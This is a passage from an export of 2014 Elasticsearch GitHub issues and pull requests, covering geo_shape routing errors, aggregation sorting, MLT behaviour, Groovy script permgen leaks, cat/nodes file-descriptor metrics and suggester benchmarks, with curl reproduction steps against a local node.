</comment><comment author="phjardas" created="2014-09-11T16:27:29Z" id="55290104">Signed. Is the CLA really necessary for such a trivial change?
</comment><comment author="brwe" created="2014-09-12T16:17:40Z" id="55425688">Thanks for fixing this!
Pushed to master, 1.x, 1.4, 1.3 and 1.2
I can understand that signing the CLA for this change is annoying but a contribution is a contribution no matter how small :) Thanks for signing! 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>geo_shape query/filter: indexed_shape has no syntax to define _routing value and throws RoutingMissingException, because _routing undefined</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7663</link><project id="" key="" /><description>Currently, GeoShape filter and query supports to pre-indexed shape as argument[1].
But, there are no way to define required `_routing` value for pre-indexed shape. This causes RoutingMissingException if routing is mandatory.

elasticsearch version 1.3.2

For example, mapping is:

```
curl -XPOST 'localhost:9200/-inx/ang/_mapping' -d'{
  "ang" : {
    "_parent" : {
      "type" : "someType"
    },
    "_routing" : {
      "required" : true
    },
    "properties" : {
      "to" : {
        "type" : "geo_shape",
        "tree_levels" : 6
      }
    }
  }
}'
```

Add some data:

```
curl -XPUT 'localhost:9200/-inx/ang/ouX6eeH5RxKQG3vJ5Ho84A?parent=111' -d '{
    "to" : {
        "type" : "circle",
        "coordinates" : [-45.0, 45.0],
        "radius" : "100m"
    }
}'
```

Let's make a query:

```
curl -XGET 'localhost:9200/_search' -d'{
  "query" : {
    "geo_shape" : {
      "to" : {
        "indexed_shape" : {
          "type" : "ang",
          "index" : "-inx",
          "path" : "to",
          "id" : "ouX6eeH5RxKQG3vJ5Ho84A"
        }
      }
    }
  }
}'
```

```
org.elasticsearch.action.search.SearchPhaseExecutionException: Failed to execute phase [query_fetch], all shards failed; shardFailures {[eryGHbZWSMa-YJiCpgVbcg][-inx][0]: 
RemoteTransportException[[Alistair Smythe][inet[/127.0.0.1:9300]][search/phase/query+fetch]]; nested: SearchParseException[[-inx][0]: from[0],size[10]:
Parse Failure [Failed to parse source [{"query":{"geo_shape":{"to":{"indexed_shape":{"id":"ouX6eeH5RxKQG3vJ5Ho84A","type":"ang","index":"-inx","path":"to"}}}}}]]];
nested: RoutingMissingException[routing is required for [-inx]/[ang]/[ouX6eeH5RxKQG3vJ5Ho84A]]; }
        at org.elasticsearch.action.search.type.TransportSearchTypeAction$BaseAsyncAction.onFirstPhaseResult(TransportSearchTypeAction.java:233) ~[elasticsearch-1.3.2.jar:na]
        at org.elasticsearch.action.search.type.TransportSearchTypeAction$BaseAsyncAction$1.onFailure(TransportSearchTypeAction.java:179) ~[elasticsearch-1.3.2.jar:na]
        at org.elasticsearch.search.action.SearchServiceTransportAction$12.handleException(SearchServiceTransportAction.java:326) ~[elasticsearch-1.3.2.jar:na]
        at org.elasticsearch.transport.netty.MessageChannelHandler.handleException(MessageChannelHandler.java:185) ~[elasticsearch-1.3.2.jar:na]
        at org.elasticsearch.transport.netty.MessageChannelHandler.handlerResponseError(MessageChannelHandler.java:175) ~[elasticsearch-1.3.2.jar:na]
```

[1] http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-geo-shape-filter.html#_pre_indexed_shape
</description><key id="42317535">7663</key><summary>geo_shape query/filter: indexed_shape has no syntax to define _routing value and throws RoutingMissingException, because _routing undefined</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/nknize/following{/other_user}', u'events_url': u'https://api.github.com/users/nknize/events{/privacy}', u'organizations_url': u'https://api.github.com/users/nknize/orgs', u'url': u'https://api.github.com/users/nknize', u'gists_url': u'https://api.github.com/users/nknize/gists{/gist_id}', u'html_url': u'https://github.com/nknize', u'subscriptions_url': u'https://api.github.com/users/nknize/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/830187?v=4', u'repos_url': u'https://api.github.com/users/nknize/repos', u'received_events_url': u'https://api.github.com/users/nknize/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/nknize/starred{/owner}{/repo}', u'site_admin': False, u'login': u'nknize', u'type': u'User', u'id': 830187, u'followers_url': u'https://api.github.com/users/nknize/followers'}</assignee><reporter username="">helllamer</reporter><labels><label>:Geo</label><label>adoptme</label><label>bug</label><label>low hanging fruit</label></labels><created>2014-09-09T15:16:43Z</created><updated>2016-11-25T18:46:27Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-09T15:19:34Z" id="54985227">thanks for reporting @helllamer 
</comment><comment author="helllamer" created="2015-01-16T15:24:26Z" id="70268798">I've rebased and squashed all 3 commits against current master: 4271835abb31aeec6c450ab7e1633cc59a5a07ff

Github automatically blocked my #7667, so I cannot comment it.
</comment><comment author="clintongormley" created="2015-05-29T16:22:15Z" id="106862949">Hi @helllamer 

Apologies - I've just seen your comment about having rebased your commit... from months ago!  Sorry, please could you open it as a new PR, otherwise we'll never see it :)

thanks
</comment><comment author="clintongormley" created="2015-11-21T18:41:16Z" id="158671273">Assigning to @nknize as this is still an issue
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add ability to sort on multiple criteria</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7662</link><project id="" key="" /><description>The terms aggregation can now support sorting on multiple criteria by replacing the sort object with an array or sort object whose order signifies the priority of the sort. The existing syntax for sorting on a single criteria also still works.

Contributes to #6917
Replaces #7588
</description><key id="42315645">7662</key><summary>Add ability to sort on multiple criteria</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Aggregations</label><label>enhancement</label><label>release highlight</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-09T14:59:51Z</created><updated>2015-06-06T19:03:23Z</updated><resolved>2014-09-15T10:19:48Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-09-09T15:01:21Z" id="54982335">First of the commits is the original from #7588, the second is the fix to the backwards compatibility issues and the intermittent test failures
</comment><comment author="jpountz" created="2014-09-12T08:41:36Z" id="55375985">This looks good to me. I think we should push this to 1.x. On master it makes sense to not have this `isSingleUserCriteria` work-around since it will not have to be able to talk to 1.x releases?
</comment><comment author="colings86" created="2014-09-15T09:33:54Z" id="55569163">Ok, I will push this change and then raise a new PR which removes the workaround on master
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix ordering of Regex.simpleMatch() parameters</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7661</link><project id="" key="" /><description>Previously we incorrectly sent them in the wrong order, which can cause
validators not to be run for dynamic settings that have been added
matching a particular wildcard.

Also adds a small unit test that makes sure we fixed this behavior.

Fixes #7651
</description><key id="42311851">7661</key><summary>Fix ordering of Regex.simpleMatch() parameters</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dakrone</reporter><labels><label>:Internal</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-09T14:24:54Z</created><updated>2015-06-07T18:47:38Z</updated><resolved>2014-09-09T14:29:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-09T14:27:19Z" id="54976868">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: Ensure BWC test run even if node.mode=local is set</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7660</link><project id="" key="" /><description>Today we throw an error if local transport is configured with BWC tests.
Yet, the BWC test need network to be enabled so test can just set the
required defaults.
</description><key id="42310051">7660</key><summary>Test: Ensure BWC test run even if node.mode=local is set</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-09T14:09:04Z</created><updated>2015-06-07T11:46:37Z</updated><resolved>2014-09-09T15:32:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-09-09T14:20:03Z" id="54975702">Nice! Can we do the same with `ExternalTestCluster` that suffers from the same problem and returns a similar error message?
</comment><comment author="s1monw" created="2014-09-09T14:53:18Z" id="54981034">@javanna can you try it out - I pushed a fix for `ExternalTestCluster`
</comment><comment author="javanna" created="2014-09-09T15:09:34Z" id="54983628">LGTM, thanks @s1monw !
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>mlt fails when document has none of the given mlt_fields</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7659</link><project id="" key="" /><description>not sure if this is a bug or a feature, but personally I would prefer getting a 200 with an empty collection rather than interpreting the 500 to something meaningful. 

this was tested against 1.3.2

```
curl -XPOST http://localhost:9200/foo
curl -XPUT http://localhost:9200/foo/bar/1 -d '{"content":"foo bar qux", "content_2":"foo bar qux"}'
curl -XPUT http://localhost:9200/foo/bar/2 -d '{"content_2":"foo bar qux", "content_3":"foo bar qux"}'
curl -XPUT http://localhost:9200/foo/bar/3 -d '{"content_3":"foo bar qux", "content_4":"foo bar qux"}'

curl -XGET 'http://localhost:9200/foo/bar/1/_mlt?mlt_fields=content_3,content_4'
{"error":"ElasticsearchException[No fields found to fetch the 'likeText' from]","status":500}%                                                                                                                                                                                

curl -XGET 'http://localhost:9200/foo/bar/3/_mlt?mlt_fields=content_3,content_4'
{"took":55,"timed_out":false,"_shards":{"total":5,"successful":5,"failed":0},"hits":{"total":0,"max_score":null,"hits":[]}}%
```
</description><key id="42308794">7659</key><summary>mlt fails when document has none of the given mlt_fields</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">lmenezes</reporter><labels><label>:More Like This</label><label>enhancement</label></labels><created>2014-09-09T13:57:08Z</created><updated>2015-11-21T18:38:36Z</updated><resolved>2015-11-21T18:38:36Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-09T14:07:49Z" id="54973889">agreed
</comment><comment author="lmenezes" created="2014-09-09T14:10:30Z" id="54974271">:+1: 
</comment><comment author="alexksikes" created="2014-09-09T14:23:48Z" id="54976332">In this case, should we return an empty document collection, or should we return an error? The former behaves more like a query, and thus returns an empty collection. But I find the later more informative in terms as to why no document could be returned (because there was no field from the provided document to fetch the `like_text` from and thus to create the MLT query). 
</comment><comment author="lmenezes" created="2014-09-09T14:34:49Z" id="54978107">yeah, it definitely gives you more insight on what is going on, but at the cost of having to explicitly handle this situation.
For me as a developer, it's no problem finding out why I got no results for a given case, but it's extra overhead having to handle that in several places.
</comment><comment author="clintongormley" created="2015-11-21T18:38:36Z" id="158671131">MLT api has been removed in favour of the MLT query.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Reduce permgen use from Groovy scripts</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7658</link><project id="" key="" /><description>Groovy scripts seem to be using more permgen than MVEL scripts do, especially when sent dynamically.

It would be nice if we reduce the amount of permgen used by these scripts, or make the permgen space recoverable in the event the script is not used.
</description><key id="42288396">7658</key><summary>Reduce permgen use from Groovy scripts</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">dakrone</reporter><labels /><created>2014-09-09T09:44:48Z</created><updated>2014-10-14T08:27:18Z</updated><resolved>2014-10-14T08:27:18Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="fizx" created="2014-09-23T19:47:43Z" id="56578663">This is because the GroovyClassLoader hangs on to every class ever created in its class cache.  In benchmarks, I can only load ~500 scripts into a Java7 vm with default permgen settings before OOM/permgen.  I can get a few thousand in with Java8.  

```
#!/bin/bash
i=0
while \
curl -m 3 -X POST localhost:9200/_search\?size=0 -d @- &lt;&lt;EOT
{
  "query": {
    "function_score": {
      "query": { "match_all": {} },
      "script_score": {
        "script": "$(echo `date +%s`.$RANDOM)",
        "lang": "groovy"
      }
    }
  }
}
EOT
do 
  i=$((i+1))
  echo
done

echo failed after $i iterations
```

The following patch works for me for dynamic scripts, and I believe it shouldn't have a downside, because (1) ES has it's own Guava class cache (that actually releases classes), and (2) I can't find a codepath in ES that even indirectly uses the GroovyClassLoader's class cache.

```
# GroovyScriptEngineService.java#113
+ loader.clearCache();
return loader.parseClass(script, generateScriptName());
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Our search server has 8 cores, but always 1~2 cores used</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7657</link><project id="" key="" /><description>Our search server has 8 cores, but always 1~2 cores used, then it bring about very very slow searching. How can I optimize it ? Thanks a lot.
</description><key id="42288192">7657</key><summary>Our search server has 8 cores, but always 1~2 cores used</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mr5</reporter><labels /><created>2014-09-09T09:42:25Z</created><updated>2014-09-09T12:08:19Z</updated><resolved>2014-09-09T12:08:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-09T12:08:19Z" id="54959520">please use the mailing list for question like this. this issue tracker is only for bugs / features.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>can shards locate in different servers/disks?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7656</link><project id="" key="" /><description>When I set the gateway as local ,I can only set these shards with one node in one server,  in case the low space of the hard disk,I need locate the shards in different servers/hard disk, what can I do ? can't ES do this ?

 Thanks
</description><key id="42281945">7656</key><summary>can shards locate in different servers/disks?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">leesword</reporter><labels><label>non-issue</label></labels><created>2014-09-09T08:22:22Z</created><updated>2014-09-09T12:04:09Z</updated><resolved>2014-09-09T12:04:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-09T12:04:02Z" id="54959175">please use the mailing list for question like this. this issue tracker is only for bugs / features.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add file descriptor details to cat/nodes</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7655</link><project id="" key="" /><description>cat/nodes currently does not report any details related to file descriptors. This adds the current number in use, the maximum number available as well as their ratio (percentage) to cat/nodes as hidden-by-default metrics. In addition, this also adds current heap usage (as a non-percentage of ts max) and ram usage (as a non-percerntage of its max) to allow tools to provide more granularity.

While adding a test for the default headers, I noticed that heap.percent and ram.percent were actually displayed by default, so I updated their documentation.

Closes #7652
</description><key id="42269494">7655</key><summary>Add file descriptor details to cat/nodes</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">pickypg</reporter><labels><label>:CAT API</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-09T04:18:22Z</created><updated>2015-03-19T09:26:16Z</updated><resolved>2014-10-15T15:20:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-09T12:07:28Z" id="54959452">LGTM 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Clarify s3 snapshot compress behavior</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7654</link><project id="" key="" /><description>Clarify s3 snapshot compress behavior only applies to metadata and no index files.
</description><key id="42269483">7654</key><summary>Clarify s3 snapshot compress behavior</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">ppearcy</reporter><labels><label>docs</label></labels><created>2014-09-09T04:17:55Z</created><updated>2014-09-28T09:11:51Z</updated><resolved>2014-09-28T09:11:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-09T12:11:05Z" id="54959759">@imotov can you take a look at this?
</comment><comment author="clintongormley" created="2014-09-25T17:49:06Z" id="56856668">Heya @ppearcy 

Thanks for this clarification.  Could I ask you to sign the CLA please? http://www.elasticsearch.org/contributor-agreement/

thanks
</comment><comment author="clintongormley" created="2014-09-28T09:11:29Z" id="57079683">thanks @ppearcy - merged!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Tools: Add script to grab ES version for BWC tests.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7653</link><project id="" key="" /><description>This should work regardless of the platform.  Even better would be to change the BWC tests to automatically download the version if it doesn't exist (this script will just skip downloading if the version already exists).  If it could be run as a pretask whenever -Dtests.bwc.version=X.Y.Z is passed, this could eliminate manual work necessary for running bwc tests, but I'm not sure how to do that (or if it is even possible) in maven.
</description><key id="42269119">7653</key><summary>Tools: Add script to grab ES version for BWC tests.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rjernst</reporter><labels><label>test</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-09T04:07:21Z</created><updated>2015-03-19T09:26:32Z</updated><resolved>2014-09-15T16:23:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-09T07:23:05Z" id="54933596">LGTM, saves some steps indeed. No maven expert here, so I'll defer on that one...
</comment><comment author="s1monw" created="2014-09-09T12:05:38Z" id="54959299">I like it, can we maybe have a doc string that says what this script does in the file?
</comment><comment author="rjernst" created="2014-09-09T14:35:07Z" id="54978154">I moved the description for argparse to a module docstring.  Does that work?
</comment><comment author="rjernst" created="2014-09-13T00:57:17Z" id="55476864">Any more comments on this @s1monw?
</comment><comment author="s1monw" created="2014-09-16T20:20:29Z" id="55807218">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>RestNodesAction - Should report File Descriptors</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7652</link><project id="" key="" /><description>`RestNodesAction` does not currently report anything related to the number of file descriptors even though it reports other similarly useful metrics, such as heap usage.
- Adding `file_desc.current` - The current number of file descriptors in use.
- Adding `file_desc.percent` - The percentage of the maximum number of file descriptors in use (`current / max * 100`).
- Adding `file_desc.max` - The maximum number of file descriptors.

In addition, I feel that it would be useful to be able to see the `heap.current` and `ram.current` (as `ByteSizeValue`s rather than only being able to see the percentage).
</description><key id="42268856">7652</key><summary>RestNodesAction - Should report File Descriptors</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/pickypg/following{/other_user}', u'events_url': u'https://api.github.com/users/pickypg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/pickypg/orgs', u'url': u'https://api.github.com/users/pickypg', u'gists_url': u'https://api.github.com/users/pickypg/gists{/gist_id}', u'html_url': u'https://github.com/pickypg', u'subscriptions_url': u'https://api.github.com/users/pickypg/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/1501235?v=4', u'repos_url': u'https://api.github.com/users/pickypg/repos', u'received_events_url': u'https://api.github.com/users/pickypg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/pickypg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'pickypg', u'type': u'User', u'id': 1501235, u'followers_url': u'https://api.github.com/users/pickypg/followers'}</assignee><reporter username="">pickypg</reporter><labels><label>enhancement</label><label>low hanging fruit</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-09T04:00:14Z</created><updated>2014-10-15T15:20:16Z</updated><resolved>2014-10-15T15:20:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Parameter position error: Regex.simpleMatch(dynamicSetting, setting.getKey()) in DynamicSettings.validateDynamicSetting() </title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7651</link><project id="" key="" /><description>the right position is :  Regex.simpleMatch( setting.getKey(), dynamicSetting)
</description><key id="42266282">7651</key><summary>Parameter position error: Regex.simpleMatch(dynamicSetting, setting.getKey()) in DynamicSettings.validateDynamicSetting() </summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">fangnoo</reporter><labels><label>adoptme</label><label>bug</label><label>low hanging fruit</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-09T03:01:06Z</created><updated>2014-09-12T09:50:41Z</updated><resolved>2014-09-09T14:29:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-09T12:16:53Z" id="54960289">thanks for opening this we will take care of it.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>NRTSuggester: Support returning StoredFields with suggestions &amp; Optional output duplication</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7650</link><project id="" key="" /><description>**NOTE:** This is a PR against `feature/nrt_suggester` and not the `master`!

The ability to return field values for given storedField(s), along with returned suggestions makes the suggesters more flexible, allowing to return associated field values for every suggestion without bloating up the in-memory FST (using `payload` increases the FST size) or having to specify the fields to return at index-time.

**Implementation details:**
- Support returning associated StoredFields of suggestions
  - Lucene docid is extracted from suggestion and used to get named StoredField value(s) at query-time
  - User can specify arbitrary number of StoredFields to be returned
  - Returned `StoredField(s)` can be accessed through the new `XLookupResult`
  - Currently supports StoredField values of type: `String`, `BytesRef` and `Number`
- Optional deduplication (query time option)
- Remove exactFirst option - simplify lookup code
- Minor changes to `TopNSearcher` &amp; how suggestions are collected
- Introduce `XLookup` interface 
- Benchmarks

**Benchmark Results:**
- **data set**: LineFileDocs
- `AnalyzingSuggester` : vanilla Lucene suggester built from `InputIterator`, uses `payload` to store field value.
- `XAnalyzingSuggester` : current ES suggester built with custom postings format, uses `payload` to store field value
- `XNRTSuggester` : new NRT suggester built with custom postings format, retrieves  field value from provided stored field name.
- **Summary**
  - number of results returned is inversely proportional to QPS
  - longer prefix length yields to higher QPS
  - Retrieving `storedField` is slower than using `payload`, at the cost of more flexibility
  - Due to the relatively small size of the dataset used, the benchmark assumes StoredFields to be in RAM

```
....
-- Stored Field Retrieval Performance
  -- prefixes: 2-4, num: 2
    AnalyzingSuggester queries: 3472, time[ms]: 83 [+- 8.64], ~kQPS: 42
    XAnalyzingSuggester queries: 3472, time[ms]: 62 [+- 1.48], ~kQPS: 56
    XNRTSuggester queries: 3472, time[ms]: 174 [+- 5.04], ~kQPS: 20
  -- prefixes: 2-4, num: 4
    AnalyzingSuggester queries: 3472, time[ms]: 122 [+- 3.34], ~kQPS: 29
    XAnalyzingSuggester queries: 3472, time[ms]: 96 [+- 2.35], ~kQPS: 36
    XNRTSuggester queries: 3472, time[ms]: 307 [+- 6.29], ~kQPS: 11
  -- prefixes: 2-4, num: 6
    AnalyzingSuggester queries: 3472, time[ms]: 172 [+- 5.38], ~kQPS: 20
    XAnalyzingSuggester queries: 3472, time[ms]: 135 [+- 4.58], ~kQPS: 26
    XNRTSuggester queries: 3472, time[ms]: 425 [+- 6.98], ~kQPS: 8
  -- prefixes: 3-6, num: 2
    AnalyzingSuggester queries: 3472, time[ms]: 72 [+- 2.84], ~kQPS: 48
    XAnalyzingSuggester queries: 3472, time[ms]: 60 [+- 3.02], ~kQPS: 58
    XNRTSuggester queries: 3472, time[ms]: 169 [+- 4.06], ~kQPS: 20
  -- prefixes: 3-6, num: 4
    AnalyzingSuggester queries: 3472, time[ms]: 107 [+- 4.29], ~kQPS: 32
    XAnalyzingSuggester queries: 3472, time[ms]: 85 [+- 3.98], ~kQPS: 41
    XNRTSuggester queries: 3472, time[ms]: 266 [+- 5.58], ~kQPS: 13
  -- prefixes: 3-6, num: 6
    AnalyzingSuggester queries: 3472, time[ms]: 139 [+- 2.76], ~kQPS: 25
    XAnalyzingSuggester queries: 3472, time[ms]: 112 [+- 3.71], ~kQPS: 31
    XNRTSuggester queries: 3472, time[ms]: 350 [+- 5.82], ~kQPS: 10
  -- prefixes: 100-200, num: 2
    AnalyzingSuggester queries: 3472, time[ms]: 134 [+- 3.11], ~kQPS: 26
    XAnalyzingSuggester queries: 3472, time[ms]: 122 [+- 3.85], ~kQPS: 28
    XNRTSuggester queries: 3472, time[ms]: 191 [+- 7.18], ~kQPS: 18
  -- prefixes: 100-200, num: 4
    AnalyzingSuggester queries: 3472, time[ms]: 136 [+- 2.72], ~kQPS: 26
    XAnalyzingSuggester queries: 3472, time[ms]: 123 [+- 3.85], ~kQPS: 28
    XNRTSuggester queries: 3472, time[ms]: 191 [+- 4.50], ~kQPS: 18
  -- prefixes: 100-200, num: 6
    AnalyzingSuggester queries: 3472, time[ms]: 136 [+- 4.07], ~kQPS: 26
    XAnalyzingSuggester queries: 3472, time[ms]: 122 [+- 4.15], ~kQPS: 28
    XNRTSuggester queries: 3472, time[ms]: 191 [+- 3.81], ~kQPS: 18

 - Storage benchmark
    AnalyzingSuggester (with payload) size[B]:    1,198,856
    XAnalyzingSuggester (with payload) size[B]:      762,592
    XNRTSuggester size[B]:      774,504
...
```

related to #7353
</description><key id="42265902">7650</key><summary>NRTSuggester: Support returning StoredFields with suggestions &amp; Optional output duplication</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/areek/following{/other_user}', u'events_url': u'https://api.github.com/users/areek/events{/privacy}', u'organizations_url': u'https://api.github.com/users/areek/orgs', u'url': u'https://api.github.com/users/areek', u'gists_url': u'https://api.github.com/users/areek/gists{/gist_id}', u'html_url': u'https://github.com/areek', u'subscriptions_url': u'https://api.github.com/users/areek/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/753679?v=4', u'repos_url': u'https://api.github.com/users/areek/repos', u'received_events_url': u'https://api.github.com/users/areek/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/areek/starred{/owner}{/repo}', u'site_admin': False, u'login': u'areek', u'type': u'User', u'id': 753679, u'followers_url': u'https://api.github.com/users/areek/followers'}</assignee><reporter username="">areek</reporter><labels /><created>2014-09-09T02:53:44Z</created><updated>2016-01-18T07:50:08Z</updated><resolved>2016-01-18T07:50:08Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-10T07:31:40Z" id="55080466">I left some comments - I like where this is going!
